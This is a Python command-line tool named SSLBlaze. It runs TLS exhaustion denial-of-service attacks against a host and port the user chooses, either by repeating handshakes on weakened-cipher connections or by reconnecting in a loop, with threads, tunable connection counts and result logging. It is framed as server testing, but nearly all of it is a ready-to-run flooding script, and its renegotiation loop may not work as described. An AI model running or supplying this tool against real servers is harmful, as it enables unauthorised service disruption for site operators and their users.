#!/usr/bin/env python3

import argparse
import logging
import sys
import time
import json
import os
import sqlite3
from concurrent.futures import ThreadPoolExecutor
import socket
import ssl
import threading
import random

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('sslblaze.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class SSLBlaze:
    def __init__(self, target: str, port: int = 443, mode: str = 'renegotiate', connections: int = 100,
                 interval: int = 1, duration: int = 60, threads: int = 5, quiet: bool = False):
        self.target = target
        self.port = port
        self.mode = mode
        self.connections = connections
        self.interval = interval
        self.duration = duration
        self.threads = threads
        self.quiet = quiet
        self.output_dir = 'sslblaze-output'
        self.output_file = os.path.join(self.output_dir, 
            f"blaze_{time.strftime('%Y%m%d_%H%M%S')}.txt")
        self.json_file = os.path.join(self.output_dir, 
            f"blaze_{time.strftime('%Y%m%d_%H%M%S')}.json")
        self.db_file = os.path.join(self.output_dir, 'sslblaze.db')
        os.makedirs(self.output_dir, exist_ok=True)
        self.actions = []
        self.running = True
        self.handshakes = 0
        self.active_connections = 0
        self.lock = threading.Lock()
        self.init_db()
        if quiet:
            logging.getLogger().handlers = [logging.FileHandler('sslblaze.log')]

    def init_db(self):
        """Initialize SQLite database for storing action logs."""
        with sqlite3.connect(self.db_file) as conn:
            cursor = conn.cursor()
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS actions (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    target TEXT,
                    port INTEGER,
                    mode TEXT,
                    handshakes INTEGER,
                    connections INTEGER,
                    status TEXT,
                    timestamp TEXT
                )
            ''')
            conn.commit()

    def store_action(self, handshakes: int, status: str):
        """Store action details in database."""
        timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
        with sqlite3.connect(self.db_file) as conn:
            cursor = conn.cursor()
            cursor.execute(
                'INSERT INTO actions (target, port, mode, handshakes, connections, status, timestamp) '
                'VALUES (?, ?, ?, ?, ?, ?, ?)',
                (self.target, self.port, self.mode, handshakes, self.active_connections, status, timestamp)
            )
            conn.commit()
        self.actions.append({
            'target': self.target,
            'port': self.port,
            'mode': self.mode,
            'handshakes': handshakes,
            'connections': self.active_connections,
            'status': status,
            'timestamp': timestamp
        })

    def create_socket(self):
        """Create and configure an SSL-wrapped socket."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            context.options |= ssl.OP_NO_SSLv2 | ssl.OP_NO_SSLv3
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            if self.mode == 'renegotiate':
                context.set_ciphers('ALL:@SECLEVEL=0')
            wrapped_sock = context.wrap_socket(sock, server_hostname=self.target)
            return wrapped_sock
        except Exception as e:
            logger.error(f"Socket creation failed: {e}")
            return None

    def renegotiate_attack(self, sock):
        """Simulate SSL renegotiation attack by initiating repeated handshakes."""
        try:
            sock.connect((self.target, self.port))
            with self.lock:
                self.active_connections += 1
                self.handshakes += 1
            local_handshakes = 1
            start_time = time.time()
            while self.running and (time.time() - start_time) < self.duration:
                try:
                    sock.do_handshake()
                    with self.lock:
                        self.handshakes += 1
                        local_handshakes += 1
                except ssl.SSLError:
                    pass
                time.sleep(self.interval)
            status = f"Renegotiation attack to {self.target}:{self.port} completed, {local_handshakes} handshakes"
            logger.info(status)
            self.store_action(local_handshakes, status)
        except Exception as e:
            status = f"Renegotiation attack failed: {e}"
            logger.error(status)
            self.store_action(local_handshakes, status)
        finally:
            with self.lock:
                self.active_connections -= 1
            sock.close()

    def reconnect_attack(self, sock):
        """Simulate SSL reconnect attack by initiating new connections."""
        try:
            sock.connect((self.target, self.port))
            with self.lock:
                self.active_connections += 1
                self.handshakes += 1
            local_handshakes = 1
            start_time = time.time()
            while self.running and (time.time() - start_time) < self.duration:
                sock.close()
                sock = self.create_socket()
                if not sock:
                    break
                sock.connect((self.target, self.port))
                with self.lock:
                    self.handshakes += 1
                    local_handshakes += 1
                time.sleep(self.interval)
            status = f"Reconnect attack to {self.target}:{self.port} completed, {local_handshakes} handshakes"
            logger.info(status)
            self.store_action(local_handshakes, status)
        except Exception as e:
            status = f"Reconnect attack failed: {e}"
            logger.error(status)
            self.store_action(local_handshakes, status)
        finally:
            with self.lock:
                self.active_connections -= 1
            sock.close()

    def worker(self):
        """Worker function to manage multiple connections."""
        sockets = []
        try:
            for _ in range(self.connections // self.threads):
                sock = self.create_socket()
                if not sock:
                    continue
                sockets.append(sock)
                if self.mode == 'renegotiate':
                    threading.Thread(target=self.renegotiate_attack, args=(sock,), daemon=True).start()
                elif self.mode == 'reconnect':
                    threading.Thread(target=self.reconnect_attack, args=(sock,), daemon=True).start()
            start_time = time.time()
            while self.running and (time.time() - start_time) < self.duration:
                time.sleep(1)
        except Exception as e:
            logger.error(f"Worker error: {e}")
        finally:
            for sock in sockets:
                sock.close()

    def run(self):
        """Run SSLBlaze to simulate SSL/TLS exhaustion attack."""
        logger.info(f"Starting SSLBlaze against {self.target}:{self.port} in {self.mode} mode")
        try:
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = [executor.submit(self.worker) for _ in range(self.threads)]
                start_time = time.time()
                while self.running and (time.time() - start_time) < self.duration:
                    time.sleep(1)
                self.running = False
                for future in futures:
                    future.result()
        except KeyboardInterrupt:
            logger.info("SSLBlaze stopped by user")
            self.running = False
        except Exception as e:
            logger.error(f"Error: {e}")
            self.running = False
        finally:
            self.save_results()

    def save_results(self):
        """Save action logs to files."""
        with open(self.output_file, 'a') as f:
            f.write("=== SSLBlaze Results ===\n")
            f.write(f"Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            for action in self.actions:
                f.write(f"[{action['timestamp']}] {action['status']}, "
                        f"Target={action['target']}:{action['port']}, "
                        f"Mode={action['mode']}, Handshakes={action['handshakes']}, "
                        f"Connections={action['connections']}\n")
        
        with open(self.json_file, 'w') as f:
            json.dump({
                'target': self.target,
                'port': self.port,
                'mode': self.mode,
                'connections': self.connections,
                'duration': self.duration,
                'total_handshakes': self.handshakes,
                'actions': self.actions,
                'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
            }, f, indent=4)
        
        logger.info(f"Results saved to {self.output_file} and {self.json_file}")

def main():
    parser = argparse.ArgumentParser(
        description="SSLBlaze: Tool to simulate SSL/TLS exhaustion attacks for server testing.",
        epilog="Example: ./sslblaze.py -t example.com -m renegotiate -c 100 -d 60"
    )
    parser.add_argument('-t', '--target', required=True,
                        help="Target hostname or IP address")
    parser.add_argument('-p', '--port', type=int, default=443,
                        help="Target port (default: 443)")
    parser.add_argument('-m', '--mode', choices=['renegotiate', 'reconnect'], default='renegotiate',
                        help="Attack mode: renegotiate or reconnect (default: renegotiate)")
    parser.add_argument('-c', '--connections', type=int, default=100,
                        help="Number of concurrent connections (default: 100)")
    parser.add_argument('-i', '--interval', type=int, default=1,
                        help="Interval between handshakes in seconds (default: 1)")
    parser.add_argument('-d', '--duration', type=int, default=60,
                        help="Attack duration in seconds (default: 60)")
    parser.add_argument('-T', '--threads', type=int, default=5,
                        help="Number of threads (default: 5)")
    parser.add_argument('-q', '--quiet', action='store_true',
                        help="Quiet mode (log to file only)")

    args = parser.parse_args()

    print("""
    ==============================
          SSLBlaze v1.0
      SSL/TLS Exhaustion Simulator
    ==============================
    """)

    try:
        blaze = SSLBlaze(
            target=args.target,
            port=args.port,
            mode=args.mode,
            connections=args.connections,
            interval=args.interval,
            duration=args.duration,
            threads=args.threads,
            quiet=args.quiet
        )
        blaze.run()
    except Exception as e:
        logger.error(f"Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()